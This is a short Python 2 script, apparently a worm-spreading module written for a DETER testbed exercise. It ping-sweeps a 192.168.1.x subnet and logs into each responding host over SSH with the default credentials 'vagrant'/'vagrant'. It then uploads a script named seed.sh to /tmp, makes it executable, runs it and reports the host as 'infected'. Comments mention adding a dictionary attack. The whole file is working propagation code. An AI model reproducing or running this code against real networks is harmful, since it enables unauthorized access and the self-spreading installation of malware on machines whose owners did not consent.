#   This is altered file from ping.py
import os
import paramiko
import sys
import time
def run(**args):
    fileName = "seed.sh"
    myList = ['localhost']
    # Function to ping and find all hosts on a network
    def pinger(hostname):
        response = os.system("ping -c 1 " + hostname)
        # and then check the response...
        if response == 0:
            pingstatus = 1
        else:
            pingstatus = 0
        return pingstatus
    #   For DETER need to change to local address!!!!
    hostname = "192.168.1."

    for i in range(1,254,1):
        res = pinger(hostname + str(i))
        if res == 1:
            myList.append(hostname + str(i))
    if myList:
        for index,ipAddr in enumerate(myList):
            print "[+] Attacking Host : %s " %ipAddr
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                # REMOVE username & password for DETER
                # loop Dictionary attack if un & pw are needed
                ssh.connect(ipAddr, username="vagrant", password="vagrant")
                sftpClient = ssh.open_sftp()
                test = sftpClient.put("../" + fileName, "/tmp/" + fileName)
                test = ssh.exec_command("chmod +x /tmp/" + fileName)
                print "[+] " + ipAddr + " infected."
                stdin,stdout,stderr = ssh.exec_command("/tmp/" +fileName)
                print "stderr: ", stderr.readlines()
                ssh.exec_command("\n")
            except paramiko.AuthenticationException:
                print "[-] Failed! ..."

    return None
